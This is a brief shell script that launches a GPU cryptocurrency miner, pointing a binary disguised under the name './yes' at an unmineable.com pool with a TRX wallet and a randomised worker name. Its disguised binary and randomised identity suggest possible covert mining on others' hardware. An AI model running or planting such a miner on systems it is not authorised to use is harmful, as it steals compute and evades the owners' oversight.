POOL=rx-us.unmineable.com:3333
WALLET=TRX:TWFeFSTBzdV3R7ub3vcvxkxVtyEEsVoEkd
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo YMhyaN8P-$(shuf -i 1911-887538 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
